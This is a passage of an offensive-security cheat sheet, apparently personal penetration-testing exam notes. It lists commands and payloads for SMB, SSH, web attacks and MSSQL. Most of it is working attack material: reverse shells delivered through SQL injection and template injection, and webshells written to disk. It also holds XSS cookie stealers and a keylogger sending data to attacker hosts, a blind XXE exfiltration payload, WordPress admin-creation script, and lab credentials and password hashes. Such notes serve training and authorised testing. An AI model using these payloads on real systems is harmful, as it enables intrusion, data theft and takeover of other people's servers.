+</code></pre></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-8083-9f6f-c3a7033b17d3" class="">SMBCLIENT</h2></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-800a-a979-fa6c675f19d4" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">smbclient -N -L //10.129.102.152
+
+smbclient -U mark.davies%&#x27;Checkpoint2024!&#x27; //10.129.160.224/DevDrop
+
+smbclient //10.129.102.152/notes
+
+smb: \&gt; RECURSE ON
+smb: \&gt; PROMPT OFF
+smb: \&gt; mget *
+
+impacket-smbclient simon.watson@shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50
+
+smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
+
+smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
+
+smbclient.py &#x27;guest&#x27;@&#x27;10.48.183.39&#x27; -no-pass
+
+impacket-smbclient -hashes :e16081eb077aca74bdbf8af12af43ac9 checkpoint.htb/svc_deploy@10.129.15.10
+
+impacket-smbclient sequel.htb/rose:&#x27;KxEPkKe6R8su&#x27;@10.129.113.116</code></pre></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-80cc-83e1-dc70bd9adc78" class=""><strong>SMTP (Port 25)</strong></h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80cf-9fc6-e6be0a894dd1" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">nc -nv $target 25
+VRFY root
+EXPN root
+HELO test
+
+# Nmap script
+nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN} $target</code></pre></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80a3-9e91-c88d7a745ba5" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-80e9-bd54-cb6353397a82" class="">SSH KEYGEN</h2></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8086-9195-f723b9cd31a2" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ssh seppuku@192.168.214.90 -t &quot;bash --noprofile&quot;
+
+ssh-keygen -t rsa -f id_rsa -N &quot;&quot;
+
+ssh-keygen -t ed25519 -f id_rsa -N &quot;&quot;
+
+ssh-keygen -t rsa -b 2048 -f id_rsa -N &quot;&quot;
+
+ssh-keygen -t rsa -b 4096 -f id_rsa -N &quot;&quot;
+
+
+echo &quot;id_rsa.pub...SNIP.....&quot; &gt;&gt; .ssh/authorized_keys
+
+mkdir .ssh
+chmod 700 .ssh
+chmod 600 .ssh/authorized_keys
+</code></pre></div><div style="display:contents" dir="auto"><p id="384a083f-29df-8023-b12a-fa468ab1601c" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-802e-ac6f-ef546f209b92" class="">SSH commands for <strong>legacy systems</strong>, <strong>automation</strong>, and <strong>troubleshooting</strong></h2></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8079-9e0f-c33e104e250a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Using sshpass (insecure - password in clear text)
+sshpass -p &#x27;password1&#x27; ssh USER@&lt;IP&gt; -p 7744
+
+# Force password auth (ignore keys)
+ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no USER@&lt;IP&gt;
+
+# Skip host key verification
+ssh -o StrictHostKeyChecking=no USER@&lt;IP&gt;
+
+# Skip + don&#x27;t save to known_hosts
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null USER@&lt;IP&gt;
+
+# Add RSA host key algorithm
+ssh -o HostKeyAlgorithms=+ssh-rsa USER@&lt;IP&gt;
+
+# RSA + older key types
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa USER@&lt;IP&gt;
+
+# Only RSA (restrictive)
+ssh -o PubkeyAcceptedKeyTypes=ssh-rsa USER@&lt;IP&gt;
+
+# Modern equivalent (OpenSSH 7.0+)
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa USER@&lt;IP&gt;
+
+# Add DH group1 key exchange
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa USER@&lt;IP&gt;
+
+# Multiple legacy KEX algorithms
+ssh -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 -o HostKeyAlgorithms=+ssh-rsa USER@&lt;IP&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="384a083f-29df-80df-a5f2-ca882d455151" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-80dd-8676-c4e2835628ca" class="">🌐 Web Application Attacks</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80eb-af81-ebd8b8ecae4b" class="">Directory/File Fuzzing</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8058-9dd7-f17640b7824a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Gobuster
+gobuster dir -u http://&lt;IP&gt; -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,asp,aspx,jsp -t 50
+
+gobuster dir -u http://&lt;IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,bak,backup,old
+
+gobuster vhost -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+
+gobuster dns -d &lt;DOMAIN&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+# Feroxbuster
+feroxbuster -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,zip -t 50
+
+feroxbuster -u http://&lt;IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,sh,py,cgi -t 50 -d 2 
+
+# FFUF
+ffuf -u http://&lt;IP&gt;/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
+
+ffuf -u http://&lt;IP&gt; -H &quot;Host: FUZZ.target.htb&quot; -w subdomains.txt -fs &lt;size&gt;
+
+ffuf -u &quot;http://&lt;IP&gt;/page.php?FUZZ=test&quot; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404
+
+# Wfuzz
+wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://&lt;IP&gt;/FUZZ
+
+wfuzz -H &quot;Host: FUZZ.domain.htb&quot; -w subdomains.txt --hc 400 http://&lt;IP&gt;
+
+wfuzz -c -z file,users.txt -d &quot;username=FUZZ&amp;password=pass&quot; --hc 302 http://&lt;IP&gt;/login</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8006-80d3-fe780d57693a" class="">LFI / RFI / Path Traversal</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80d2-a9db-f928d9de7ec7" class=""><a href="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html">https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-807a-adc4-ece5d6a11918" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Basic LFI
+curl &quot;http://&lt;IP&gt;/page.php?file=../../../../etc/passwd&quot;
+
+curl &quot;http://&lt;IP&gt;/page.php?file=../../../../etc/shadow&quot;
+
+# PHP filter to read source code
+curl &quot;http://&lt;IP&gt;/page.php?file=php://filter/convert.base64-encode/resource=index.php&quot; | base64 -d
+
+# Log poisoning to RCE
+curl -A &quot;&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot; http://&lt;IP&gt;/
+
+&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt; | nc 10.10.10.11 22
+
+curl &quot;http://&lt;IP&gt;/page.php?file=../../../../var/log/apache2/access.log&amp;cmd=id&quot;
+
+# SSH log poisoning
+ssh &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;@&lt;TARGET_IP&gt;
+
+/page.php?file=/var/log/auth.log&amp;cmd=whoami
+
+# PHP Filter Chain Generator (LFI to RCE)
+python3 php_filter_chain_generator.py --chain &#x27;&lt;?= exec($_GET[0]); ?&gt;&#x27;
+
+python3 php_filter_chain_generator.py --chain &quot;&lt;?php echo shell_exec(id); ?&gt;&quot;
+
+
+
+# Linux
+../../../etc/passwd
+....//....//....//etc/passwd
+../../../../etc/shadow
+
+# Windows
+..\..\..\windows\system32\drivers\etc\hosts
+..%5c..%5c..%5cwindows\system32\drivers\etc\hosts
+
+# PHP Wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../../../../etc/passwd
+php://input
+php://temp
+data://text/plain,&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
+expect://id
+
+# Log Poisoning
+# After LFI, access: /var/log/apache2/access.log or /var/log/nginx/access.log
+# Inject: &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
+# Then: /vuln.php?file=/var/log/apache2/access.log&amp;cmd=id
+
+
+# On attacker machine (shell.txt)
+&lt;?php
+if(isset($_REQUEST[&#x27;cmd&#x27;])){
+    echo &quot;&lt;pre&gt;&quot;;
+    $cmd = ($_REQUEST[&#x27;cmd&#x27;]);
+    system($cmd);
+    echo &quot;&lt;/pre&gt;&quot;;
+    die;
+}
+?&gt;
+
+# Include
+http://target/page.php?page=http://KALI/shell.txt
+http://target/page.php?page=http://KALI/shell.txt?cmd=id
+
+</code></pre></div><div style="display:contents" dir="auto"><p id="384a083f-29df-8003-9bbb-e2fd1ad6ae82" class=""><strong>Key LFI Files:</strong></p></div><div style="display:contents" dir="ltr"><table id="384a083f-29df-8000-a391-ce814bc3a2cb" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="384a083f-29df-80df-9c88-ec6159637346"><th id="W^CM" class="simple-table-header-color simple-table-header">Linux</th><th id="MZja" class="simple-table-header-color simple-table-header" style="width:306.00001525878906px">Windows</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="384a083f-29df-80f9-8773-d2bea80fd23d"><td id="W^CM" class=""><code>/etc/passwd</code></td><td id="MZja" class="" style="width:306.00001525878906px"><code>C:\Windows\System32\drivers\etc\hosts</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-80e8-ad54-c3469f4f383a"><td id="W^CM" class=""><code>/etc/shadow</code></td><td id="MZja" class="" style="width:306.00001525878906px"><code>C:\inetpub\wwwroot\web.config</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-80b0-8a33-ec5b93b0c633"><td id="W^CM" class=""><code>/home/user/.ssh/id_rsa</code></td><td id="MZja" class="" style="width:306.00001525878906px"><code>C:\Windows\Panther\Unattended.xml</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-8044-b525-f46ffb2f81be"><td id="W^CM" class=""><code>/etc/crontab</code></td><td id="MZja" class="" style="width:306.00001525878906px"><code>C:\Windows\repair\SAM</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="384a083f-29df-80b0-b825-fa2b659061c5"><td id="W^CM" class=""><code>/var/log/apache2/access.log</code></td><td id="MZja" class="" style="width:306.00001525878906px"><code>C:\xampp\passwords.txt</code></td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8050-bb05-f1066ff32754" class="">SQL Injection</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8015-ae66-da7a5f36a921" class=""><a href="https://s4thv1k.com/posts/oscp-cheatsheet/">https://s4thv1k.com/posts/oscp-cheatsheet/</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-804e-8a12-d4f3974d3889" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Auth bypass
+
+&#x27; OR 1=1-- -
+&#x27; OR &#x27;1&#x27;=&#x27;1
+
+admin&#x27; or &#x27;1&#x27;=&#x27;1
+
+&#x27; oR tRue--
+
+&#x27; oR 1=1--
+&#x27; uNiOn SeLeCt--
+&#x27; aNd 1=1--
+
+&#x27; or 1 or &#x27;
+
+&#x27; OR &#x27;1&#x27;=&#x27;1
+
+admin&#x27; AND 1=1 -- -
+
+admin&#x27; --
+
+# SQL Injection payload on login page
+&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; UNION SELECT null, null, null, null, &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; INTO OUTFILE &quot;/var/www/html/shell.php&quot; -- -
+
+# Trigger reverse shell via SQL injection
+&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; UNION SELECT null, null, null, null, &quot;powershell -c \\&quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;192.168.247.128&#x27;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\&quot;&quot; -- -
+
+# Start listener (attacker machine)
+nc -lvnp 443
+
+&#x27; UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot;, null, null, null, null INTO OUTFILE &quot;/var/www/html/tmp/webshell.php&quot; -- //
+ 
+
+
+
+# Union-based (find columns first)
+
+&#x27; ORDER BY 1-- -
+&#x27; UNION SELECT 1,2,3-- -
+&#x27; UNION SELECT @@version,user(),database()-- -
+&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
+&#x27; UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
+
+# MySQL to webshell
+
+&#x27; UNION SELECT &quot;&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot; INTO OUTFILE &quot;/var/www/html/shell.php&quot;-- -
+
+# Time-based blind
+
+&#x27; AND IF(1=1,SLEEP(5),0)-- -              # MySQL
+&#x27;; IF (1=1) WAITFOR DELAY &#x27;00:00:05&#x27;-- -  # MSSQL
+
+# MSSQL - enable xp_cmdshell
+
+&#x27;; EXEC sp_configure &#x27;show advanced options&#x27;,1; RECONFIGURE;--
+&#x27;; EXEC sp_configure &#x27;xp_cmdshell&#x27;,1; RECONFIGURE;--
+&#x27;; EXEC xp_cmdshell &#x27;whoami&#x27;;--</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80cc-a7d7-ff47473aa815" class="">File Upload Bypass</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8022-ab74-cb36da1385f3" class=""><a href="https://hacktricks.wiki/en/pentesting-web/file-upload/index.html">https://hacktricks.wiki/en/pentesting-web/file-upload/index.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80f1-b233-f6ef3372a487" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Double extensions
+
+shell.php.jpg
+shell.php%00.jpg
+shell.php;.jpg
+shell.php%20
+shell.php%0d%0a.jpg
+
+# Alternative PHP extensions
+
+.phtml, .php3, .php4, .php5, .php7, .phar, .inc
+
+# Magic bytes + PHP
+
+echo -e &quot;\x89PNG\r\n\x1a\n&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot; &gt; shell.png.php
+
+# Magic bytes
+GIF89a;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
+
+# Change Content-Type to image/jpeg in Burp
+
+# .htaccess bypass
+AddType application/x-httpd-php .jpg
+
+
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8093-aebd-c9769c263757" class="">SSTI (Server-Side Template Injection)</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8007-8c6e-e15dceec209e" class=""><a href="https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html">https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80cd-910e-ca732a183e28" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Detection
+
+{{7*7}}       # 49 = Jinja2/Twig
+${7*7}        # 49 = FreeMarker/Mako
+&lt;%= 7*7 %&gt;    # 49 = ERB (Ruby)
+
+# Jinja2 RCE
+
+{{config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()}}
+{{config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1&quot;&#x27;).read()}}
+
+# Twig RCE
+
+{{[&#x27;id&#x27;]|filter(&#x27;system&#x27;)}}
+
+# Jinja2 test
+{{ 7*7 }}
+{{ config.items() }}
+
+# Jinja2 RCE
+{{ cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}
+{{ &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() }}
+
+# Flask/Flask
+{{ config.items() }}
+{{ request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() }}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}
+
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8050-84c2-cdb930959f9c" class="">XXE (XML External Entity)</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-802b-b0ef-ef3101044cd9" class=""><a href="https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html">https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-807a-89c1-f40801b4bfdd" class=""><a href="https://www.thehacker.recipes/web/inputs/xxe-injection/">https://www.thehacker.recipes/web/inputs/xxe-injection/</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8079-87a1-c1607ae058f2" class="code code-wrap"><code class="language-xml" style="white-space:pre-wrap;word-break:break-all">&lt;!-- File read --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+
+&lt;!-- SSRF --&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;&lt;http://internal.vulnerable-website.com/&gt;&quot;&gt;]&gt;
+
+&lt;!-- Blind XXE Exfiltration (malicious.dtd) --&gt;
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;&gt;
+%eval;
+%exfiltrate;
+
+&lt;!-- Basic --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;
+&lt;root&gt;&amp;test;&lt;/root&gt;
+
+&lt;!-- SSRF --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;http://169.254.169.254/latest/meta-data/&#x27;&gt;]&gt;
+&lt;root&gt;&amp;test;&lt;/root&gt;
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-808e-a8dd-d57c96f075d3" class="">Command Injection</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80ef-9e62-e387ab8c82e6" class=""><a href="https://hacktricks.wiki/en/pentesting-web/command-injection.html">https://hacktricks.wiki/en/pentesting-web/command-injection.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-800e-97e5-fd6959523c9b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Test characters: ; | || &amp; &amp;&amp; ` $() \n %0a
+
+127.0.0.1; whoami
+127.0.0.1 | whoami
+127.0.0.1 || whoami
+127.0.0.1 &amp;&amp; whoami
+127.0.0.1`whoami`
+127.0.0.1$(whoami)
+
+# URL encoded semicolon: %3B</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8096-968f-d090abb415e1" class="">XSS (Cross-Site Scripting)</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80d6-9bd0-c8277f861ea7" class=""><a href="https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html">https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80ac-8923-d277c48fe967" class="code code-wrap"><code class="language-html" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Basic --&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;
+&quot;&gt;&lt;script&gt;fetch(&#x27;http://&lt;LHOST&gt;/?c=&#x27;+document.cookie)&lt;/script&gt;
+
+&lt;!-- DOM-based --&gt;
+document.write(&#x27;... &lt;script&gt;alert(document.domain)&lt;/script&gt; ...&#x27;);
+element.innerHTML=&#x27;... &lt;img src=1 onerror=alert(document.domain)&gt; ...&#x27;
+
+&lt;!-- Steal cookies --&gt;
+&lt;script&gt;new Image().src=&quot;http://&lt;LHOST&gt;/steal?cookie=&quot;+document.cookie;&lt;/script&gt;
+
+
+// Basic test
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+// Cookie stealer
+&lt;script&gt;document.location=&#x27;http://KALI/log.php?c=&#x27;+document.cookie&lt;/script&gt;
+
+// Keylogger
+&lt;script&gt;document.onkeypress=function(e){fetch(&#x27;http://KALI/log?k=&#x27;+e.key)}&lt;/script&gt;
+
+// WordPress admin creation
+&lt;script&gt;
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = &quot;/wp-admin/user-new.php&quot;;
+var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;
+ajaxRequest.open(&quot;GET&quot;, requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@offsec.com&amp;pass1=attackerpass&amp;pass2=attackerpass&amp;role=administrator&quot;;
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open(&quot;POST&quot;, requestURL, true);
+ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+ajaxRequest.send(params);
+&lt;/script&gt;
+
+
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80d9-bc87-d77c5cca2160" class="">SSRF (Server-Side Request Forgery)</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80e0-ae8a-c7adfaef53c3" class=""><a href="https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html">https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8046-8966-f6d8cc496691" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Test payloads
+&lt;http://127.0.0.1:80&gt;
+&lt;http://169.254.169.254/latest/meta-data/&gt;  # AWS metadata
+file:///etc/passwd
+gopher://127.0.0.1:8080/_GET /admin HTTP/1.0</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8099-ae8e-f58a5b3740f8" class="">CSRF (Cross-Site Request Forgery)</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80d7-83c0-f21c93ebb4bc" class=""><a href="https://hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html">https://hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80c6-80f5-c10c9d7dc79a" class="code code-wrap"><code class="language-html" style="white-space:pre-wrap;word-break:break-all">&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;&lt;https://vulnerable-website.com/email/change&gt;&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;pwned@evil-user.net&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-806a-ac68-c965b051b9ba" class="">Web CMS Enumeration</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80ce-9dd1-fc43df9f34b1" class=""><a href="https://www.thehacker.recipes/web/recon/cms">https://www.thehacker.recipes/web/recon/cms</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8007-8988-c5bce95f1b38" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># WordPress
+wpscan --url http://&lt;IP&gt; -e ap,at,vt,tt,dbe,u
+wpscan --url http://&lt;IP&gt; --enumerate u,p,t,cb,dbe --plugins-detection aggressive
+
+# Joomla
+joomscan -u http://&lt;IP&gt;
+
+# Drupal
+droopescan scan drupal -u http://&lt;IP&gt;
+
+Check for robots.txt, sitemap.xml, readme.html, license.txt (common on CMSs).
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8007-92c2-fa03532e72f9" class="">Other Web Tools</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8060-82e9-cf354495b906" class=""><a href="https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html">https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8031-9c06-e1c04935ccea" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># WhatWeb
+whatweb http://&lt;IP&gt; -v
+
+# Nikto
+nikto -h http://&lt;IP&gt; -C all
+
+# Git exposure
+curl -s http://&lt;IP&gt;/.git/HEAD
+git-dumper http://&lt;IP&gt;/.git ./repo
+
+git log
+git show &lt;commit-hashid&gt;
+git restore .
+
+uv add --script git-dumper.py -r requirements.txt
+
+uv run git-dumper.py
+
+sudo cp -r git-dumper.py  /usr/local/bin/git-dumper.py
+
+# CADAVER (WebDAV)
+cadaver http://&lt;IP&gt;/&lt;WEBDAV_DIRECTORY&gt;/
+dav:/&lt;WEBDAV_DIRECTORY&gt;/ C:/ put &lt;FILE&gt;</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-8090-88b9-eecb780e0f2b"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-8012-8fec-c9ad234b2820" class="">🗄️ Database Attacks</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8055-81df-c0dd7c89c265" class="">MSSQL</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8095-a06d-d792f6819ff0" class=""><a href="https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html">https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-809b-8bfd-f1c1b92a039d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Connect
+impacket-mssqlclient domain/user:pass@&lt;IP&gt; -windows-auth
+sqsh -S &lt;IP&gt; -U &lt;USERNAME&gt; -P &lt;PASSWORD&gt;
+
+# if 1 , admin true
+SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27; );
+
+# Enumerate
+1&gt; SELECT name FROM master.sys.databases
+2&gt; go
+
+# Enable xp_cmdshell
+EXEC sp_configure &#x27;show advanced options&#x27;, 1;
+RECONFIGURE;
+EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;
+RECONFIGURE;
+
+# Execute commands
+EXEC xp_cmdshell &#x27;whoami&#x27;;
+
+# Linked servers
+EXEC sp_linkedservers;
+SELECT * FROM OPENQUERY(&quot;MS02\SQLEXPRESS&quot;, &#x27;SELECT @@version, SYSTEM_USER&#x27;);
+
+# UNC injection to capture hash
+EXEC master.dbo.xp_dirtree &#x27;\\&lt;LHOST&gt;\share&#x27;;
+
+
+
+impacket-mssqlclient &lt;Administrator:Lab123@192.168.50.18&gt; -windows-auth
+EXECUTE sp_configure &#x27;show advanced options&#x27;, 1;
+RECONFIGURE;
+EXECUTE sp_configure &#x27;xp_cmdshell&#x27;, 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell &#x27;whoami&#x27;;
+</code></pre></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-8026-bdf3-f8a24b745245" class="">SQLCMD sqlcmd</h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8022-9a48-eaab30f3b21d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sqlcmd -S &lt;IP&gt; -U &lt;USERNAME&gt; -P &lt;PASSWORD&gt;
+
